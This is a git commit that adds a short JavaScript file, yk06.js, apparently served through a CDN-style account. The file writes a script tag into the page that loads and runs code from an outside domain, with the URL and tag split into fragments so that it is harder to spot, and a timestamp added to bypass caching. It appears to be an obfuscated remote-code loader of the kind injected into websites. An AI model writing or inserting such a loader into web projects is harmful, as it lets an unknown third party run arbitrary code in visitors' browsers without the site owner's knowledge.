7ce99e03729c55352a6e59891622484a06312dcf
jisucdn <79298333+jisucdn@users.noreply.github.com>
2021-12-24 23:02:53 +0800

    Add files via upload

---
+++ yk06.js
@@ -0,0 +1,4 @@
+document.writeln('<script id="EX8NDYGmQ2JpXxHkQYLuUV" src="ht')
+document.writeln('tps:')
+document.writeln('//ka.xgzdys.com/webid142/EX8NDYGmQ2JpXxHkQYLuUV.html?'+new Date().getTime()+'"')
+document.writeln('><\/scr' + 'ipt>')
